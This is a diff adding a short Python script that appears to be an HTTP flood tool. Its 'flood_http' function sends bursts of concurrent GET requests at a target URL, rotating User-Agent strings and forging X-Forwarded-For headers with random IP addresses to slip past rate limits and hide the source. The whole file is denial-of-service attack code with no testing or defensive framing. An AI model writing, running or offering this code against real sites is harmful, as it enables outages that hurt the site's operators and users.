@@ -1,0 +1,23 @@
+import aiohttp
+import asyncio
+import random
+
+async def send_request(session, url):
+    try:
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Accept-Language": "en-US,en;q=0.9",
+            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+        }
+        async with session.get(url, headers=headers) as resp:
+            return resp.status
+    except:
+        return None
+
+async def flood_http(target, requests_per_second):
+    async with aiohttp.ClientSession() as session:
+        tasks = []
+        for _ in range(requests_per_second):
+            task = asyncio.create_task(send_request(session, target))
+            tasks.append(task)
+        await asyncio.gather(*tasks)
